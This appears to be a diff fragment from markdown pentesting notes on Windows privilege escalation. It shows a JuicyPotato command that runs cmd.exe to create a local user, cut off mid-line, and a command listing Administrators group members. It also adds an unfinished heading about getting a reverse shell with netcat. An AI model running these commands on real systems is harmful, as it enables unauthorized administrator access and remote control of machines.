@@ -15,3 +15,6 @@ Juicypotato -t * -p C:\windows\system32\cmd.exe -a "/c net user haider password@
 ```cmd
 net localgroup Administrators
 ```
+
+**ENABLING A PATH TO GET A SHELL ITS NEW WAY**
+*WE CAN GET A REVERSE SHELL , BUT IT NEED NETCAT OR SOME *
